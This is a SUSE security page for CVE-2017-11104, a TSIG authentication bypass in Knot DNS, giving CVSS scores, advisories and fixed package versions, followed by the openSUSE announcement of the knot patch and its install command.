* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2017-11104

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2017-11103.html) [[Index]](index.html) [[Next]](CVE-2017-11107.html)

### Upstream information

[CVE-2017-11104 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11104)

#### Description

Knot DNS before 2.4.5 and 2.5.x before 2.5.2 contains a flaw within the TSIG protocol implementation that would allow an attacker with a valid key name and algorithm to bypass TSIG authentication if no additional ACL restrictions are set, because of an improper TSIG validity period check.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [important](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 4.3 |
| Vector | AV:N/AC:M/Au:N/C:N/I:P/A:N |
| Access Vector | Network |
| Access Complexity | Medium |
| Authentication | None |
| Confidentiality Impact | None |
| Integrity Impact | Partial |
| Availability Impact | None |

[CVSS v3 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 5.9 |
| Vector | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N |
| Attack Vector | Network |
| Attack Complexity | High |
| Privileges Required | None |
| User Interaction | None |
| Scope | Unchanged |
| Confidentiality Impact | None |
| Integrity Impact | High |
| Availability Impact | None |
| CVSSv3 Version | 3.1 |

SUSE Bugzilla entry: [1047841](https://bugzilla.suse.com/show_bug.cgi?id=1047841) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [openSUSE-SU-2018:1395-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/OJQU3BR42CVRBOIUNEZEFJ7ROSUUSHS5/#OJQU3BR42CVRBOIUNEZEFJ7ROSUUSHS5), published Fri Dec 8 15:48:39 2023
* [openSUSE-SU-2020:1085-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/), published Thu Dec 7 12:55:40 2023
* [openSUSE-SU-2020:1086-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/), published Thu Dec 7 12:55:40 2023
* [openSUSE-SU-2020:1112-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/), published Thu Dec 7 12:55:40 2023
* [openSUSE-SU-2020:1232-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/F77H2KTFPGPWBORN3BK3OCSGGZDFZLHA/), published Thu Dec 7 12:55:40 2023

### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| SUSE Package Hub 15 SP1 | * `knot >= 1.6.8-bp151.4.3.1` | Patchnames: openSUSE-2020-1112 |
| SUSE Package Hub 15 SP2 | * `knot >= 1.6.8-bp152.4.3.1` | Patchnames: openSUSE-2020-1232 |
| openSUSE Leap 15.1 | * `knot >= 1.6.8-lp151.4.3.1` | Patchnames: openSUSE-2020-1085 |
| openSUSE Leap 15.2 | * `knot >= 1.6.8-lp152.5.3.1` | Patchnames: openSUSE-2020-1086 |

---

### SUSE Timeline for this CVE

CVE page created: Sat Jul 8 14:56:41 2017

CVE page last modified: Fri Dec 8 17:14:22 2023

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from lists.opensuse.org_48995c3c_20250125_055254.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/#42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS)

# [security-announce] openSUSE-SU-2020:1085-1: moderate: Security update for knot

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

26 Jul
2020

26 Jul
'20

19:12

openSUSE Security Update: Security update for knot
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2020:1085-1
Rating: moderate
References: #1047841
Cross-References: CVE-2017-11104
Affected Products:
openSUSE Leap 15.1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for knot fixes the following issues:
- CVE-2017-11104: Fixed an improper implementation of TSIG protocol which
could have allowed an attacker with a valid key name and algorithm to
bypass TSIG authentication (boo#1047841).
Patch Instructions:
To install this openSUSE Security Update use the SUSE recommended installation methods
like YaST online\_update or "zypper patch".
Alternatively you can run the command listed for your product:
- openSUSE Leap 15.1:
zypper in -t patch openSUSE-2020-1085=1
Package List:
- openSUSE Leap 15.1 (x86\_64):
knot-1.6.8-lp151.4.3.1
knot-debuginfo-1.6.8-lp151.4.3.1
knot-debugsource-1.6.8-lp151.4.3.1
References:
<https://www.suse.com/security/cve/CVE-2017-11104.html>
<https://bugzilla.suse.com/1047841>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS/#42OALAJKQFRD7A2WI4VNPJ67KYQUEQBS)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.


